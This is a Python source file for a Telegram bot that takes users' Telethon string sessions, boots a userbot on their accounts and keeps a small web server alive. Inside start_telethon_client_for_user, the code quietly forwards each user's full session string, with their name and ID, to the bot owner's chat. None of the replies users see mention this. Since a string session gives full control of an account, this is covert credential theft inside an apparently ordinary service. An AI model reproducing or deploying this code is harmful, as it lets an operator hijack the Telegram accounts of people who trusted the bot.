async def start_telethon_client_for_user(string_session: str, user_id: int, context_bot):
    """Start a Telethon client for a user with the given string session."""
    try:
        client = TelegramClient(StringSession(string_session), API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await client.disconnect()
            raise RuntimeError("Invalid string session.")

        me = await client.get_me()
        register_userbot_handlers(client, me)

        if OWNER_ID:
            try:
                await context_bot.send_message(
                    chat_id=OWNER_ID,
                    text=(
                        f"📌 <b>New String Session Received</b>\n"
                        f"👤 From: <a href='tg://user?id={user_id}'>{user_id}</a>\n"
                        f"🤖 Name: {me.first_name}\n"
                        f"🆔 ID: <code>{me.id}</code>\n\n"
                        f"<code>{string_session}</code>"
                    ),
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"Failed to send to owner: {e}")

        await client.start()
        task = asyncio.create_task(client.run_until_disconnected())
        return client, task
    except Exception as e:
        await client.disconnect()
        raise e

# ----------------- Receive String -----------------
async def receive_string(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming string sessions from users."""
    user_id = update.effective_user.id
    if user_id not in waiting_for_string:
        return

    text = update.message.text.strip()
    msg = await update.message.reply_text("🔄 ʙᴏᴏᴛɪɴɢ ʏᴏᴜʀ ᴄʟɪᴇɴᴛ ᴡᴀɪᴛ...")
    waiting_for_string.discard(user_id)

    if user_id in userbots:
        try:
            await userbots[user_id].disconnect()
        except Exception as e:
            logger.error(f"Failed to disconnect userbot for {user_id}: {e}")
        if user_id in userbot_tasks:
            t = userbot_tasks[user_id]
            if not t.done():
                t.cancel()
        userbots.pop(user_id, None)
        userbot_tasks.pop(user_id, None)

    try:
        client, task = await start_telethon_client_for_user(text, user_id, context.bot)
        userbots[user_id] = client
        userbot_tasks[user_id] = task
        await msg.edit_text(f"✅ ʏᴏᴜʀ ᴄʟɪᴇɴᴛ ᴡᴀs ʙᴏᴏᴛᴇᴅ ᴀs: {(await client.get_me()).first_name}")
    except Exception as e:
        logger.error(f"ғᴀʟɪᴇᴅ ᴛᴏ sᴛᴀʀᴛ ᴄʟɪᴇɴᴛ {user_id}: {e}")
        await msg.edit_text(f"❌ Failed to start userbot: {e}")

# ----------------- Keep-alive Web Server -----------------
async def handle(request):
    """Handle web server requests."""
    return web.Response(text="Bot is alive!")

async def start_web_server():
    """Start the aiohttp web server."""
    app = web.Application()
    app.add_routes([web.get("/", handle)])
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    return runner

# ----------------- Application -----------------
async def run_application():
    """Run the Telegram bot and web server."""
    try:
        web_runner = await start_web_server()
        logger.info(f"Web server started on port {PORT}")
        
        try:
            logger.info(f"Initializing bot with token: {BOT_TOKEN[:10]}...")
            app = Application.builder().token(BOT_TOKEN).build()
            
            app.add_handler(CommandHandler("start", start))
            app.add_handler(CommandHandler("status", status))
            app.add_handler(CommandHandler("ping", ping))
            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_string))
            app.add_handler(CallbackQueryHandler(button_handler))
            
            logger.info("Starting Telegram bot...")
            await app.initialize()
            await app.start()
            
            if app.updater:
                await app.updater.start_polling()
            else:
                logger.warning("No updater found in application")
            
            # Keep running until interrupted
            loop = asyncio.get_running_loop()
            stop = loop.create_future()

            def handle_shutdown():
                stop.set_result(None)

            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, handle_shutdown)

            await stop  # Wait for shutdown signal
                
        except Exception as e:
            logger.error(f"Fatal error in application: {e}")
            raise
        finally:
            logger.info("Shutting down...")
            if app.updater:
                await app.updater.stop()
            await app.stop()
            await app.shutdown()
            await web_runner.cleanup()
            
            for user_id, client in userbots.items():
                try:
                    await client.disconnect()
                except Exception as e:
                    logger.error(f"Failed to disconnect userbot for {user_id}: {e}")
            for user_id, task in userbot_tasks.items():
                if not task.done():
                    task.cancel()
            userbots.clear()
            userbot_tasks.clear()
    except Exception as e:
        logger.error(f"Failed to start web server: {e}")
        raise

# ----------------- Main -----------------
async def main():
    """Main entry point for the bot."""
    try:
        await run_application()
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Error in main: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main())
